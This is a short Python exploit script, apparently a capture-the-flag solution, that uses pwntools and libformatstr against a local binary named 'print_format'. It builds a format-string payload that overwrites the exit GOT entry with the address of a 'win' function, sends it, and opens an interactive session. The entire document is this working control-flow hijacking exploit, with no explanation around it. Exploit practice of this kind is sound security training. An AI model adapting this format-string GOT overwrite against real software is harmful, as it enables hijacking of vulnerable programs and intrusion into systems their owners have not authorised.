from libformatstr import *
from pwn import *
from binascii import *
context.log_level = 'debug'
bufsiz = 100
#r = process('./print_test')
elf=ELF('./print_format')
exit_got=0x0002ff70
win_addr=0x565d25fd
bufsiz = 100
r = process('./print_format')
p = FormatStr()
p[exit_got] = win_addr
buf = p.payload(10,3)
r.sendline(buf)
r.interactive()